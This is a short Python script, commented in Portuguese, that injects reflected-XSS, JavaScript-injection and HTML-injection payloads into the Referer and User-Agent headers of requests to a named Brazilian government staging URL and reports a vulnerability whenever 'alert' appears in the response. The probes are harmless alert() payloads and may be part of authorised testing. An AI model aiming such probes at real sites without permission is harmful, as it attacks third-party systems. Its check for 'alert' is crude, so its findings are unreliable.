import requests
import httpx
import asyncio
from bs4 import BeautifulSoup

# Configurações iniciais
url_base = "https://sone.codatahml.pb.gov.br/javascript/bookmark-site.js"
headers_base = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
}
# Payloads para testar
payloads = {
    'Reflected XSS via Referer': ("<script>alert('XSS via Referer')</script>", 'Referer'),
    'JS Injection via Referer': ("javascript:alert('JS Injection via Referer');", 'Referer'),
    'HTML Injection via Referer': ("<h1>HTML Injection via Referer</h1>", 'Referer'),
    'Reflected XSS via User-Agent': ("<script>alert('XSS via User-Agent')</script>", 'User-Agent')
}

# Função assíncrona para enviar a requisição e verificar a resposta
async def enviar_requisicao_e_verificar_resposta(headers_modificados, tipo_vulnerabilidade, teste_numero):
    async with httpx.AsyncClient(http2=True) as client:
        resposta_teste = await client.get(url_base, headers=headers_modificados)
        
        print(f"\nTeste {teste_numero}: Testando '{tipo_vulnerabilidade}'.")

        # Verificar se o teste foi bem-sucedido
        if "alert" in resposta_teste.text:
            print(f"Teste #{teste_numero} PASSOU: Vulnerabilidade de '{tipo_vulnerabilidade}' possivelmente encontrada!")
            return 1
        else:
            print(f"Teste #{teste_numero} FALHOU: A vulnerabilidade não foi detectada.")
            return 0

# Função principal para executar os testes
async def executar_testes():
    total_testes = 0
    testes_passaram = 0
    testes_falharam = 0

    for tipo_vulnerabilidade, (payload, header) in payloads.items():
        total_testes += 1
        headers_modificados = headers_base.copy()
        headers_modificados[header] = payload  # Modificar o cabeçalho especificado com o payload

        resultado_teste = await enviar_requisicao_e_verificar_resposta(headers_modificados, tipo_vulnerabilidade, total_testes)
        if resultado_teste == 1:
            testes_passaram += 1
        else:
            testes_falharam += 1

    # Reportar os resultados finais
    print(f"\nTotal de Testes: {total_testes}")
    print(f"Testes Passaram: {testes_passaram}")
    print(f"Testes Falharam: {testes_falharam}")

# Executar os testes
if __name__ == "__main__":
    asyncio.run(executar_testes())